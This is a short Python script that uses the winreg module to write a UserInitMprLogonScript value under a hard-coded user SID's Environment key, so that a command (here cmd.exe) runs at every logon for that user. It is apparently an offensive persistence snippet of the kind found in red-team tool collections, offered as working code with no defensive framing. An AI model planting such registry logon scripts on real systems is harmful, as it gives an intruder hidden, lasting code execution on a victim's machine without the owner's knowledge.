import winreg

# Windows logon script keys
#reghive = winreg.HKEY_CURRENT_USER
#regpath = "Environment"

reghive = winreg.HKEY_USERS
userSID = "S-1-5-21-524849353-310586374-791561826-1004"
regpath = userSID+"\Environment"

command = "cmd.exe"

# Add registry logon script
key = winreg.OpenKey(reghive,regpath,0,access=winreg.KEY_WRITE)
winreg.SetValueEx(key,"UserInitMprLogonScript",0,winreg.REG_SZ,command)
